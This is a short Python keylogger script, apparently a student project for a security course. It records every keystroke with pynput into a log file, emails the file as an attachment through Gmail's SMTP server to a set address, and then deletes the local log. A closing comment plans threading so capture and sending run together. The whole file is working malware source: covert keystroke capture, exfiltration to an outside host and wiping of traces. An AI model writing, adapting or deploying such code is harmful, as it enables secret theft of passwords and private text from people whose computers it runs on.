from pynput import keyboard

import smtplib
from email import encoders
from email.mime.base import MIMEBase
from email.mime.multipart import MIMEMultipart

from datetime import datetime
from os import remove

def on_press(key):
    with open("log.txt", "a") as log:
        try:
            log.write(key.char + "\n")
            print(key.char)
        except AttributeError:
            # I think I might want to deal with space here
            if key == keyboard.Key.space:
                log.write(" \n")
                print(" ")
        log.close()

def on_release(key):
    if key == keyboard.Key.esc:
        return False

# Collect events until released
def keylogger():
    with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
        listener.join()

# Send email and wipe log
def send_log():

    # Send email
    now = datetime.now()
    date_time = now.strftime("%d/%m/%Y, %H:%M:%S")

    msg = MIMEMultipart()
    msg['From'] = "scruffy.comp681.sa@gmail.com"
    msg['To'] = "scruffy.comp6841.sa@gmail.com"
    msg['Subject'] = f"log: {date_time}"

    filename = "log.txt"

    with open("log.txt", "rb") as fp:
        part = MIMEBase("application", "octet-stream")
        part.set_payload(fp.read())
    encoders.encode_base64(part)
    
    part.add_header("Content-Disposition", f"attachment; filename= {filename}")
    msg.attach(part)

    server = smtplib.SMTP("smtp.gmail.com", 587)
    server.ehlo()
    server.starttls()
    server.login("scruffy.comp6841.sa@gmail.com", "REDACTED")
    server.sendmail("scruffy.comp6841.sa@gmail.com", "scruffy.comp6841.sa@gmail.com", msg.as_string())

    # Delete log
    remove("log.txt")

send_log()
keylogger()

# Plan: Run simultaneous threads for processes
